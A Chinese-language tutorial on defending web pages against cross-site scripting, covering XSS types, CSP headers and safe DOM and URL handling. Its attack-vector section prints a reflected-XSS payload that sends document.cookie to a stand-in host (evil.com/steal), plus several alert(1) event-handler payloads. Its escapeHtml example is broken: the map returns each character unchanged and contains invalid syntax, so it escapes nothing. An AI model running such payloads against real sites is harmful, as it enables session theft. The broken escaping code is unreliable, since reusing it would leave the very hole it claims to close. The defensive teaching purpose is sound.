XSS 防御

XSS 是最常见的 Web 安全漏洞——理解攻击原理、掌握防御策略和 CSP，是前端安全的第一道防线。

1. 核心概念与定义

XSS（Cross-Site Scripting，跨站脚本攻击）是攻击者向网页中注入恶意脚本，在其他用户浏览时执行的攻击。XSS 可以窃取 Cookie/Token、篡改页面内容、重定向用户、发起 CSRF 攻击。

XSS 的本质是：不可信的数据被当作代码执行。防御的核心原则：永不信任用户输入，对所有外部数据进行转义/过滤/沙箱化。

2. 关键特性与工作原理

2.1 XSS 类型

类型注入位置持久性危害
存储型 XSS服务器存储（如评论）持久高（所有用户受害）
反射型 XSSURL 参数临时中（需诱导点击）
DOM 型 XSS前端 JS 直接渲染临时中（前端漏洞）

2.2 常见攻击向量

HTML<!-- 反射型：URL 参数直接渲染 -->
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- 绕过 <script> 过滤 -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">

<!-- JavaScript 伪协议 -->
<a href="javascript:alert(1)">点击</a>

<!-- 事件处理器 -->
<div onmouseover="alert(1)">hover me</div>

<!-- DOM 型：innerHTML 注入 -->
element.innerHTML = userInput; // 危险！

2.3 防御策略层级

层级策略防御类型
输入层服务端过滤/验证所有类型
输出层HTML 转义存储型/反射型
前端层避免 innerHTML，使用 textContentDOM 型
HTTP 层CSP（Content Security Policy）所有类型
Cookie 层HttpOnly + Secure减轻 Cookie 窃取

3. 代码示例与最佳实践

示例一：HTML 转义函数

JavaScript/**
 * HTML 实体转义：防止 XSS 的基础方法
 */
function escapeHtml(str) {
  const map = {
    '&': '&',
    '<': '<',
    '>': '>',
    '"': '"',
    "'": ''',
    '/': '/',
  };
  return String(str).replace(/[&<>"'/]/g, (c) => map[c]);
}

// 使用
const userInput = '';
const safe = escapeHtml(userInput);
// <script>alert("xss")</script>
document.getElementById('output').textContent = safe;

// ❌ 危险写法
// document.getElementById('output').innerHTML = userInput;

// ✅ 安全写法
// 1. textContent（纯文本，自动转义）
// 2. innerHTML + escapeHtml（需要 HTML 时）

示例二：CSP 配置

HTTP# Content-Security-Policy：限制页面能加载哪些资源

# 严格模式（推荐）
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://cdn.example.com;
  img-src 'self' data: https:;
  font-src 'self' https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

# Nginx 配置
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline';" always;

# 开发阶段：使用 report-only 模式（只报告不阻止）
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /api/csp-report

# CSP 指令说明
# default-src  — 所有资源的默认策略
# script-src   — JS 来源（最关键，防 XSS）
# style-src    — CSS 来源
# img-src      — 图片来源
# connect-src  — Ajax/WebSocket 来源
# frame-ancestors — 允许嵌入的父页面（防点击劫持）
# unsafe-inline — 允许内联脚本/样式（削弱安全性）
# unsafe-eval  — 允许 eval（强烈不推荐）

示例三：安全的 DOM 操作

JavaScript// ❌ 危险：直接使用 innerHTML
element.innerHTML = userInput;

// ✅ 安全：使用 textContent（纯文本）
element.textContent = userInput;

// ✅ 安全：需要 HTML 时，先转义再插入
element.innerHTML = escapeHtml(userInput);

// ✅ 安全：使用 DOM API 创建元素
function createSafeElement(tag, text, attrs) {
  const el = document.createElement(tag);
  el.textContent = text; // 安全
  Object.entries(attrs || {}).forEach(([key, value]) => {
    el.setAttribute(key, value); // 安全
  });
  return el;
}

// ❌ 危险：document.write
document.write(userInput);

// ❌ 危险：eval / new Function
eval(userInput);
new Function(userInput)();

// ✅ 安全：使用 JSON.parse 解析 JSON 字符串
const data = JSON.parse(jsonString); // 而非 eval

示例四：URL 安全处理

JavaScript// ❌ 危险：直接使用用户输入的 URL
window.location.href = userInput;         // 可能是 javascript:alert(1)
element.innerHTML = `<a href="${userInput}">`; // 同上

// ✅ 安全：验证 URL 协议
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, location.origin);
    // 只允许 http/https 协议
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

function safeRedirect(url) {
  if (isSafeUrl(url)) {
    window.location.href = url;
  } else {
    console.warn('不安全的 URL:', url);
  }
}

// ✅ 安全：a 标签的 href
function createSafeLink(url, text) {
  if (!isSafeUrl(url)) return null;
  const a = document.createElement('a');
  a.href = url;
  a.textContent = text;
  a.rel = 'noopener noreferrer'; // 防止 window.opener 攻击
  return a;
}

4. 常见问题与坑点

前端转义够了，后端还需要处理吗？ +

前后端都需要。前端转义只能防御当前页面，后端存储的是原始数据，其他客户端（APP、RSS）可能不转义。最佳实践：存储原始数据，输出时根据上下文转义（HTML 转义、JS 转义、URL 编码等）。

CSP 会影响功能吗？ +

会。CSP 阻止不符合策略的资源加载，内联脚本/样式、eval、CDN 外资源都可能被阻止。建议先用 Content-Security-Policy-Report-Only 观察报告，再逐步收紧策略。nonce-hash 模式可以兼顾安全和内联脚本。

🚫 dangerouslySetInnerHTML / v-html 是 XSS 的后门

React 的 dangerouslySetInnerHTML 和 Vue 的 v-html 绕过了框架的自动转义，直接插入 HTML。必须确保内容经过 DOMPurify 清洗，否则等于给 XSS 开门。

1什么是 XSS？有哪些类型？怎么防御？
XSS 是注入恶意脚本到网页。三种类型：存储型（持久，危害最大）、反射型（URL参数）、DOM型（前端JS漏洞）。防御：① 输入验证/过滤；② 输出转义（HTML/JS/URL）；③ 避免innerHTML，用textContent；④ CSP 限制脚本来源；⑤ Cookie 设 HttpOnly；⑥ 使用 DOMPurify 清洗 HTML。
2什么是 CSP？怎么配置？
Content Security Policy 是 HTTP 响应头，限制页面能加载哪些来源的资源。最关键的是 script-src，禁止内联脚本和 eval。配置：Content-Security-Policy: default-src 'self'; script-src 'self'。开发阶段用 Report-Only 先观察。CSP 是 XSS 的最后一道防线。
